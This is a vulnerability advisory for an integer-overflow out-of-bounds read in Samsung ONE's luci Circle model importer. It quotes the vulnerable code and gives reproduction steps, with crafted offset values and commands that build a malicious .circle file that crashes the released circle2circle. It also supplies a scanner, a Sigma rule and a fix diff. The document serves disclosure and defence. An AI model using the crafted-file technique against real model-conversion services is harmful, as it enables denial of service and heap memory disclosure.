# Samsung ONE luci: integer overflow in the extended-Buffer bounds check of the Circle importer

The `luci` Circle importer in Samsung ONE (`compiler/luci/import`) guards the
"extended buffer" mechanism, which stores constant tensor data outside the
flatbuffer for models larger than 2 GB, with `offset + size > file_size`. Both
operands are attacker-controlled `uint64` values read from the model file and
`offset` is never capped, so the sum wraps. With `offset = 0xFFFFFFFFFFFFFFC0`
and `size = 0x40` the sum is `0`, the guard passes, and the following `memcpy`
reads `size` bytes starting at `file_data - 0x40`. Loading a crafted `.circle`
file with a stock release build therefore performs a heap out-of-bounds read:
a reliable crash with a large offset, or a bounded copy of adjacent heap bytes
into the imported constant tensor with a small one.

> ## ⚠ Unpatched in the latest release, and there is no maintained upstream
>
> The latest release, `1.30.1` (`ede4bacc61157f37de895282e1a4b6f19a65afd9`,
> 2025-09-19), contains the vulnerable code and ships it in the
> `one-compiler-*` packages. `Samsung/ONE` was frozen in 2026 (issue
> [#16479](https://github.com/Samsung/ONE/issues/16479): "Sync with internal
> infra is stopped") and its `master` no longer contains the source tree. A
> copy of the code remains on the default branch of the community fork
> `one-project/ONE`, where the same lines are unchanged. No fixed version
> exists or is expected. See [Mitigation](#mitigation).

| | |
|---|---|
| CVE | none assigned |
| CWE | CWE-190 (Integer Overflow or Wraparound), leading to CWE-125 (Out-of-bounds Read). Contributing: CWE-617 (the only bound on `file_data()` is an `assert`), CWE-20 |
| Project | [`Samsung/ONE`](https://github.com/Samsung/ONE), component `compiler/luci` (`libluci_import`, used by `circle2circle` and the `one-*` tools) |
| Affected | releases `1.30.0` and `1.30.1`; `release/1.30.1` at `ede4bacc61157f37de895282e1a4b6f19a65afd9`; `one-project/ONE` `master` at `de7f4736dc4c4f5e47f72a4022a9aa9ac6d1ad1a`. The extended-buffer branch is absent from `1.29.0` and `1.28.0`. |
| Fixed in | none |
| CVSS v3.1 | `AV:L/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:L` = **4.4 Medium** |
| Reported by | s1ko ([github.com/s1ko](https://github.com/s1ko), `s1ko@riseup.net`) |

## Scope, stated plainly

This is a read primitive, not a write primitive. The impact is denial of
service of the process that loads the model, plus a bounded disclosure of heap
memory that sits immediately before the model buffer. There is no demonstrated
path to code execution and this advisory does not claim one.

The attacker has to get a `.circle` file in front of a `luci`-based tool,
typically `circle2circle` or the `one-import-*` / `onecc` pipeline, and a user
or CI job has to load it. Models are routinely downloaded from third parties,
which is why this is scored with `UI:R` rather than treated as not
attackable.

What was verified and what was not:

- Verified against the **released** `one-compiler-noble_1.30.1_amd64.deb`
  (`circle2circle`, `libluci_import.so`): the 64-byte read from `file - 64`
  is performed (traced with an `LD_PRELOAD` shim), and a variant with a large
  `offset` terminates the process with SIGSEGV in `memcpy` called from
  `luci::CircleConstNodeBuilder::build`.
- Verified with an AddressSanitizer harness that reproduces the shipped code
  path: `heap-buffer-overflow`, `READ of size 64`.
- **Not** demonstrated end to end: that the leaked bytes reach an output
  file. The crafted model has an unused constant tensor, and the converted
  output does not retain it. Whether leaked bytes survive into an output
  depends on the graph the attacker builds around the constant; this was not
  tested, so the information-disclosure part of the impact is plausible, not
  proven.

## Threat model

A victim loads or converts a model file they did not produce with a `luci`
based tool, or a service does so on user-supplied models (model-conversion
endpoints, CI that converts uploaded models, on-device toolchains). The
attacker controls every byte of the file, including the `Buffer.offset` and
`Buffer.size` fields, which live in the flatbuffer but describe a region
*outside* it.

`luci::ImporterEx::importVerifyModule()`, the path used when a model is loaded
from a file name, runs `flatbuffers::Verifier` / `circle::VerifyModelBuffer`
when the file is under 2 GB. That check validates the flatbuffer structure. It
does not and cannot validate what an extended `Buffer` points at, because that
data is by definition not inside the flatbuffer, so the verifier does not stop
this bug. `Importer::importModule(const uint8_t *, size_t)` and
`ImporterEx::importModule(const std::vector<char> &)` do not verify at all.

## Execution

### Root cause

`compiler/luci/import/src/Nodes/CircleConst.cpp`, lines 184-204 at
`ede4bacc61157f37de895282e1a4b6f19a65afd9` (`release/1.30.1`, tag `1.30.1`):

```cpp
    uint32_t r_size = static_cast<uint32_t>(r_buffer->size());
    // match binary level to flatbuffers::Vector
    temp_buffer.resize(r_size + sizeof(uint32_t));

    uint8_t *t_data = temp_buffer.data();
    const uint8_t *f_data = reader->file_data(r_buffer->offset());
    if (f_data == nullptr)
    {
      // NOTE this shouldn't happen
      assert(false);
      return nullptr;
    }
    memcpy(t_data, &r_size, sizeof(r_size));
    t_data = t_data + sizeof(r_size);
    if (r_buffer->offset() + r_buffer->size() > reader->file_size())
    {
      // NOTE this shouldn't happen
      assert(false);
      return nullptr;
    }
    memcpy(t_data, f_data, r_buffer->size());
```

This branch is entered when `r_buffer->offset() > 1` (line 177). The only
limit applied to the two fields before the guard is
`r_buffer->size() >= std::numeric_limits<uint32_t>::max()` (line 179), which
bounds `size` below 2^32 and says nothing about `offset`. The schema declares
both as `ulong` (`res/CircleSchema/0.9/circle_schema.fbs`, `table Buffer`).

`f_data` is computed from the attacker's `offset` before the guard runs.
`CircleReader::file_data()`, `compiler/luci/import/src/CircleReader.cpp`
lines 417-424 at the same commit, applies no runtime check:

```cpp
// NOTE need caution not to access beyond _file_data + _file_size.
// current method doesn't have this guard.
const uint8_t *CircleReader::file_data(uint64_t offset) const
{
  assert(_file_data);
  assert(offset < _file_size);
  return (_file_data == nullptr) ? nullptr : _file_data + offset;
}
```

Under `NDEBUG` both asserts compile away. The source comment above the
function records that the guard is missing.

With `offset = 0xFFFFFFFFFFFFFFC0` and `size = 0x40`:

1. `offset + size` is `0x1_0000_0000_0000_0000`, which truncates to `0` in
   `uint64_t`.
2. `0 > file_size` is false, so the guard does not fire.
3. `f_data = _file_data + 0xFFFFFFFFFFFFFFC0`, which is `_file_data - 0x40`.
4. `memcpy(t_data, f_data, 0x40)` reads 64 bytes that precede the buffer
   holding the model file.

Because `size < 2^32`, any `offset` that makes the sum wrap to a value at or
below `file_size` lies in the top 4 GiB of the 64-bit space. The primitive is
therefore always a read from 1 byte to roughly 4 GiB *before* `_file_data`.
Small distances read adjacent heap memory, large distances run off the mapped
region and crash.

### Reproduction

Files are in [`poc/`](poc/); see [`poc/README.md`](poc/README.md) for the
full build instructions.

Against the released binary (Ubuntu noble package, run here on a different
distribution; its libraries resolve from the package):

```sh
curl -LO https://github.com/Samsung/ONE/releases/download/1.30.1/one-compiler-noble_1.30.1_amd64.deb
dpkg-deb -x one-compiler-noble_1.30.1_amd64.deb root
C2C=root/usr/share/one/bin/circle2circle

python3 -I poc/patch_buffer.py poc/poc.circle dos.circle 0xFFFFFFFFF0000000 0x10000000
$C2C dos.circle out.circle; echo $?
```

Observed on `one-compiler-noble_1.30.1_amd64.deb`
(sha256 `abb93ee063867b3023e9cffee60293503c48cabe90525960d6ee783f0b896987`),
2026-10-28:

```
139
```

and under `gdb`:

```
Program received signal SIGSEGV, Segmentation fault.
#0  0x00007ffff7771749 in ?? () from /usr/lib/x86_64-linux-gnu/libc.so.6
#1  0x00007ffff7f47a09 in luci::CircleConstNodeBuilder::build(int, luci::GraphBuilderContext*) const () from .../lib/libluci_import.so
#2  0x00007ffff7f864c4 in ?? () from .../lib/libluci_import.so
#3  0x00007ffff7f3c213 in luci::Importer::importModule(circle::Model const*) const () from .../lib/libluci_import.so
#4  0x00007ffff7f3d022 in luci::Importer::importModule(unsigned char const*, unsigned long) () from .../lib/libluci_import.so
#5  0x00007ffff7f3d4e6 in luci::ImporterEx::importVerifyModule(std::__cxx11::basic_string<...> const&) const () from .../lib/libluci_import.so
```

The same run through `importVerifyModule` confirms the structural verifier
accepts the crafted file.

The unmodified `poc/poc.circle` (small distance) does not crash a release
build. It exits `0` and the 64-byte copy is made, which the preload shim shows:

```
[shim] new(224) = 0x55ece3534910 (model file buffer)
[shim] memcpy n=64 src=0x55ece35348d0 (file-64) dst=0x55ece3535a14
```

`benign.circle` (in-bounds `offset = 4`, `size = 0x10`) takes the same branch
and shows `src = file+4`, which isolates the wrap as the difference.

AddressSanitizer harness (`poc/harness.cpp`, built with `-DNDEBUG`):

```
guard PASSED (offset+size=0x0), about to memcpy 0x40 bytes from f_data=0x7cfbf95e0140 (file_data=0x7cfbf95e0180)
==761298==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7cfbf95e0140
READ of size 64 at 0x7cfbf95e0140 thread T0
    #0 in memcpy
    #1 in main harness.cpp:134
0x7cfbf95e0140 is located 32 bytes after 224-byte region
```

The harness is a mirror of the shipped logic built on the generated schema
types, not a link against `libluci_import`; the released-binary run above is
the direct evidence for the real library.

Run it only against software and models you are authorized to test.

## Detection

**Static, on the model file.** In the `buffers` vector of the model a legitimate
file uses `Buffer.offset > 1` only for tensors stored outside the flatbuffer in
models larger than 2 GB. Flag any `Buffer` where:

- `offset >= file_size`, or
- `offset > UINT64_MAX - size` (the exact wrap), or
- `offset + size > file_size`.

[`poc/scan_circle.py`](poc/scan_circle.py) implements this with no
dependencies and exits `1` on a hit:

```
$ python3 -I poc/scan_circle.py poc/poc.circle poc/benign.circle
poc/poc.circle: SUSPECT buffers[1] offset=0xffffffffffffffc0 size=0x40 file=0xe0: offset past end of file; offset + size wraps uint64
poc/benign.circle: buffers[1] offset=0x4 size=0x10: note: extended buffer in a 224 byte file
```

A byte-pattern YARA rule is not offered: the fields sit at table-relative
positions that depend on the flatbuffer layout, so a fixed pattern would
either miss reordered files or match unrelated data. Parsing, as above, is the
reliable check.

**Static, on source.** Any `a + b > limit` bounds check over two untrusted
64-bit values is the same bug. For this codebase:

```sh
grep -rnE 'offset\(\) \+ .*size\(\) *>' compiler/ runtime/
```

**Runtime.** SIGSEGV (exit status 139) of `circle2circle` or an `one-import-*`
process during import, with a backtrace through `memcpy` and
`luci::CircleConstNodeBuilder::build` in `libluci_import.so`. Under
AddressSanitizer: `heap-buffer-overflow ... READ of size N` at the second
`memcpy` of the extended-buffer branch.

```yaml
title: Samsung ONE circle2circle crash while importing a model
id: 6a1b6a1c-6b9f-4f63-9d3e-3a1f7a2d5c10
status: experimental
description: |
  Detects abnormal termination by SIGSEGV of a Samsung ONE model tool during
  import. A crafted .circle file whose extended Buffer offset wraps uint64
  makes libluci_import read far before the model buffer. A crash is the only
  externally visible signal; a short-distance variant leaves no trace.
references:
  - https://github.com/Samsung/ONE
logsource:
  product: linux
  category: process_termination
detection:
  selection:
    Image|endswith:
      - '/circle2circle'
      - '/one-import-tflite'
      - '/one-import-onnx'
      - '/one-import-tf'
    ExitSignal: 11
  condition: selection
falsepositives:
  - Other defects in the same tools that also crash on import
level: medium
```

A short-distance exploitation (a few dozen bytes, as in `poc.circle`) produces
no crash and no log line, so crash telemetry alone does not cover it; scan
models before they are loaded.

## Mitigation

There is no patched release to upgrade to. Options, in order of preference:

1. **Scan untrusted models before loading them** with
   `poc/scan_circle.py` or an equivalent check, and reject any `Buffer` that
   points outside the file.
2. **Patch locally** if you build ONE from source (`release/1.30.1` or the
   `one-project/ONE` fork). Replace the additive guard with a subtractive one
   that cannot overflow, and make it a thrown error so it survives `NDEBUG`:

   ```diff
   --- a/compiler/luci/import/src/Nodes/CircleConst.cpp
   +++ b/compiler/luci/import/src/Nodes/CircleConst.cpp
   @@
   -    if (r_buffer->offset() + r_buffer->size() > reader->file_size())
   +    const uint64_t f_off = r_buffer->offset();
   +    const uint64_t f_size = r_buffer->size();
   +    const uint64_t f_len = reader->file_size();
   +    if (f_off >= f_len || f_size > f_len - f_off)
        {
   -      // NOTE this shouldn't happen
   -      assert(false);
   -      return nullptr;
   +      throw std::runtime_error("CircleConst: extended Buffer out of file bounds.");
        }
   ```

   `f_off >= f_len` is tested first so `f_len - f_off` cannot underflow. Do
   the same check before `reader->file_data(offset)` is trusted, or make
   `CircleReader::file_data()` return `nullptr` for `offset >= _file_size`
   instead of asserting.
3. **Contain the conversion step.** Run model conversion as an unprivileged
   user in a sandbox with no credentials in its environment, so a crash or a
   heap read yields nothing of value.
4. **Do not rely on the flatbuffer verifier.** It is already on the
   file-path import route and does not cover this.

Mapping: CWE-190 and CWE-125 mitigations (safe integer arithmetic, bounds
validation at the trust boundary); NIST SP 800-53r5 `SI-10`; NIST SP 800-218
`PW.5` and `PW.7`; MITRE ATT&CK mitigation M1048 (Application Isolation and Sandboxing) for the
sandbox measure.

## Timeline

| Date | Event |
|---|---|
| 2025-09-19 | Release `1.30.1` published (`ede4bacc61157f37de895282e1a4b6f19a65afd9`); latest release as of 2026-10-28 |
| 2026-04-09 | [Samsung/ONE#16479](https://github.com/Samsung/ONE/issues/16479) opened by a maintainer: the repository is to become private or move to an unrelated organization |
| 2026-04-21 | [PR #16481](https://github.com/Samsung/ONE/pull/16481) merged (tensor-size integer overflows; see Prior coverage). It does not modify the extended-buffer guard. |
| 2026-05-07 | Maintainer comment on #16479: "Sync with internal infra is stopped, so merged PR after this time can be lost." |
| 2026-07-02 | Reported via huntr.com (report 9c2168a9-c9cd-4918-a1cd-b500a48777d9). No triage, validation or response from the platform as of 2026-10-28. |
| 2026-07-10 | `Samsung/ONE` `master` `342395fc0d6bf29e2ea939ef0a7eced18d677f81` "Remove source from repo (#16489)" |
| 2026-10-28 | Verified against the released `1.30.1` binaries and published |

## Prior coverage

No earlier public report of this bug was found. Searches of `Samsung/ONE`
issues and pull requests for the extended-buffer guard, `CircleConst` and
`file_data` returned nothing relevant, and no GitHub Security Advisory exists
for the repository.

Samsung's PSIRT published eight CVEs on 2026-04-22 against "Samsung Open
Source ONE", all referencing PR #16481: CVE-2026-40448, -40449, -40450,
-41664, -41665, -41666, -41667 (integer overflows in tensor size and copy
calculations, per the CVE texts) and CVE-2026-6839
(CWE-1284, validation of STRING tensor offsets in `CircleConst.cpp`). They are
different defects. The one in the same file is the STRING offset check in
`copy_data<loco::DataType::STRING>`; the patch for it adds a loop over the
string-offset table and leaves the extended-buffer branch untouched, which is
why the guard is still byte-identical in `one-project/ONE` `master`
(`CircleConst.cpp` lines 214 and 220, `CircleReader.cpp` lines 419-424).

## References

- Latest release — https://github.com/Samsung/ONE/releases/tag/1.30.1
- Vulnerable code — `compiler/luci/import/src/Nodes/CircleConst.cpp` and `compiler/luci/import/src/CircleReader.cpp` at `ede4bacc61157f37de895282e1a4b6f19a65afd9`
- Verified import entry point — `compiler/luci/import/src/ImporterEx.cpp`, `importVerifyModule`, same commit
- Schema — `res/CircleSchema/0.9/circle_schema.fbs`, `table Buffer`, same commit
- Freeze notice — https://github.com/Samsung/ONE/issues/16479
- Community fork — https://github.com/one-project/ONE
- PoC files — https://huggingface.co/s1ko/poc-samsung-one-circle-oob
- Adjacent, different defects — https://github.com/Samsung/ONE/pull/16481

## License

MIT, see [LICENSE](LICENSE).
